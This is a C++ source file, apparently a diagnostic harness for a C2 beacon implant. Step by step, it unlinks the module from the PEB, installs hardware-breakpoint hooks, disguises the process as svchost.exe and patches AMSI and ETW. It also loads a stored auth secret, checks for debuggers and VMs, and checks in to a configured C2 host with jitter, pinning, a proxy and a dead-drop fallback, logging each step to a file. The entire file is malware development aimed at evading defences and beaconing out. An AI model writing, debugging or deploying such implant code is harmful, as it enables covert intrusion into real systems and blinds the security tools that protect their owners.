// A9 anti-step probe: runs beacon_main's pre-network anti block step by
// step and logs each step to a file, so a wedged step names itself.
// Build mirrors compile_beacon's flags (same defines/libs, console host,
// default CRT entry).
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "build_id.h"
#include "c2_config.h"
#include "config_encrypted.h"
#include "evasion.h"
#include "crypto.h"
#include "peb_unlink.h"
#include "network.h"

static const char* LOGP =
    "C:\\Users\\ilysm\\AppData\\Local\\Temp\\opencode\\c2\\anti_probe.log";

static void mark(const char* s) {
    FILE* f = fopen(LOGP, "a");
    if (!f) return;
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "%02d:%02d:%02d.%03d %s\n",
            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, s);
    fclose(f);
}

int main() {
    DeleteFileA(LOGP);
    mark("00 start");
    WSADATA wsa;
    mark("01 WSAStartup ...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { mark("E1 WSA failed"); return 1; }
    mark("02 WSAStartup done");

    mark("03 hide_module ...");
    peb_unlink::hide_module();
    mark("04 hide_module done");

    mark("05 install_hwbp_engine ...");
    anti::install_hwbp_engine();
    mark("06 install_hwbp_engine done");

    mark("07 rename_process ...");
    anti::masquerade::rename_process(L"svchost.exe");
    mark("08 rename_process done");

    mark("09 patch_amsi ...");
    anti::patch_amsi();
    mark("10 patch_amsi done");

    mark("11 patch_etw ...");
    anti::patch_etw();
    mark("12 patch_etw done");

    mark("13 load_auth_secret ...");
    {
        std::vector<BYTE> persisted;
        crypto::load_auth_secret(persisted);
        char buf[80];
        snprintf(buf, sizeof(buf), "14 load_auth_secret done len=%zu", persisted.size());
        mark(buf);
    }

    mark("15 is_debugger_present ...");
    {
        bool d = anti::is_debugger_present();
        mark(d ? "16 debugger=YES" : "16 debugger=no");
    }
    mark("17 is_vm ...");
    {
        bool v = anti::is_vm();
        mark(v ? "18 vm=YES" : "18 vm=no");
    }

    mark("19 checkin ...");
    net::C2Config cfg;
    cfg.beacon_id = BEACON_AUTH_ID;
    cfg.host = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
    cfg.port = C2_PORT;
    cfg.sleep_ms = 5000;
    cfg.base_sleep_ms = 5000;
    cfg.jitter = 30;
    cfg.seed_ladder(C2_HOST, C2_HOSTS, C2_HOST_PINS, C2_HOST_PUBKEY_PINS);
    cfg.proxy = C2_PROXY;
    cfg.dead_drop = C2_DEADDROP;
    std::string resp = net::checkin(
        cfg, "{\"build_id\":\"" BUILD_ID "\",\"sysinfo\":\"anti-probe\"}");
    mark(resp.empty() ? "20 checkin EMPTY (fail)" : "20 checkin OK");
    FILE* f = fopen(LOGP, "a");
    if (f) { fprintf(f, "RESP %.180s\n", resp.c_str()); fclose(f); }
    return 0;
}
